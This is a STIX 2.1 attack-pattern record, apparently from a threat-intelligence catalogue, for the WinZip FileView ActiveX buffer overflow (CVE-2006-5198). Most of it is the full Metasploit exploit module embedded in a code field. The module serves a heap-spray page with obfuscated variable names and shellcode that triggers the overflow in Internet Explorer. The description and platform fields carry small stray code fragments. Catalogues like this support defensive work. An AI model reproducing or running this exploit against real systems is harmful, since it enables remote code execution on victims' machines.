{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f2feff70-cbe6-46c0-945a-563ac9b7c436",
    "created": "2024-08-14T16:40:23.277142Z",
    "modified": "2024-08-14T16:40:23.277146Z",
    "name": "WinZip FileView (WZFILEVIEW.FileViewCtrl.61) ActiveX Buffer Overflow",
    "description": " The FileView ActiveX control (WZFILEVIEW.FileViewCtrl.61) could allow a remote attacker to execute arbitrary code on the system. The control contains several unsafe methods and is marked safe for scripting and safe for initialization. A remote attacker could exploit this vulnerability to execute arbitrary code on the victim system. WinZip 10.0 <= Build 6667 are vulnerable.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/winzip_fileview.rb",
            "external_id": "winzip_fileview.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => '{A09AE68F-B14D-43ED-B713-BA413F034904}',\n  #  :method     => 'CreateNewFolderFromName',\n  #  :rank       => NormalRanking  # reliable memory corruption\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WinZip FileView (WZFILEVIEW.FileViewCtrl.61) ActiveX Buffer Overflow',\n      'Description'    => %q{\n          The FileView ActiveX control (WZFILEVIEW.FileViewCtrl.61) could allow a\n        remote attacker to execute arbitrary code on the system. The control contains\n        several unsafe methods and is marked safe for scripting and safe for initialization.\n        A remote attacker could exploit this vulnerability to execute arbitrary code on the\n        victim system. WinZip 10.0 <= Build 6667 are vulnerable.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'dean <dean[at]zerodaysolutions.com>' ],\n      'References'     =>\n        [\n          [ 'CVE','2006-5198' ],\n          [ 'OSVDB', '30433' ],\n          [ 'BID','21060' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2/ IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0c0c0c0c } ]\n        ],\n      'DisclosureDate' => '2007-11-02',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Set the return.\n    ret    = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n    boom   = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|\n      <html>\n        <object id='#{vname}' classid='clsid:A09AE68F-B14D-43ED-B713-BA413F034904'></object>\n        <script language=\"JavaScript\">\n        function #{boom}() {\n        var #{rand1} = unescape('#{shellcode}');\n        var #{rand2} = unescape('#{ret}');\n        var #{rand3} = 20;\n        var #{rand4} = #{rand3} + #{rand1}.length;\n        while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\n        var #{rand5} = #{rand2}.substring(0,#{rand4});\n        var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\n        while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\n        var #{rand7} = new Array();\n        for (#{var_i} = 0; #{var_i} < 800; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\n        var #{rand8} = \"A\";\n        for (#{var_i} = 0; #{var_i} < 1024; #{var_i}++) { #{rand8} = #{rand8} + #{rand2} }\n        #{vname}.CreateNewFolderFromName(#{rand8});\n        }\n        if ((typeof #{vname}.CreateNewFolderFromName) != \"undefined\") {\n          #{boom}();\n        }\n        </script>\n      </html>\n      |\n\n    print_status(\"Sending exploit HTML...\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-11-02",
    "x_mitre_platforms": [
        "win'"
    ]
}